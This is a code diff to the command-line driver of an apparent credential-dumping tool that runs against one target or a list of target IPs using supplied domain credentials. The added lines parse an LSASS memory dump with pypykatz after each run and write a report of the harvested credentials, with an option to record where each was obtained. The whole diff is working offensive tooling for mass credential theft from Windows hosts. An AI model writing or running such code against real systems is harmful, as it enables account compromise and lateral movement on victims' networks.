@@ -1,6 +1,7 @@
 from cred_tool import Dumper
 import argparse
 import sys
+import pdb
 
 
 def main():
@@ -12,7 +13,12 @@ def main():
     parser.add_argument(
         "-L", "--target_file", help="File with targets ip, line by line"
     )
-
+    parser.add_argument(
+        "-vr",
+        "--verbose_report",
+        type=int,
+        help="equals 1 or 0| Creds obtaining location will be written in report file",
+    )
     args = parser.parse_args()
     if len(sys.argv) > 1:
         pass
@@ -21,6 +27,7 @@ def main():
     username = args.username
     password = args.password
     domain = args.domain
+    verbose_report = args.verbose_report
 
     if args.target_file:
         targets_list = []
@@ -35,6 +42,10 @@ def main():
                     target=target.strip(),
                 )
                 task.run()
+                Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
+                Dumper.create_report(
+                    filename="./temp_report.json", verbose=verbose_report
+                )
             except:
                 print(f"Something went wrong with {target}")
     else:
@@ -43,6 +54,10 @@ def main():
             username=username, password=password, domain=domain, target=target
         )
         task.run()
+        Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
+        Dumper.create_report(
+            filename=f"./reports/{target}_report.txt", verbose=verbose_report
+        )
 
 
 if __name__ == "__main__":
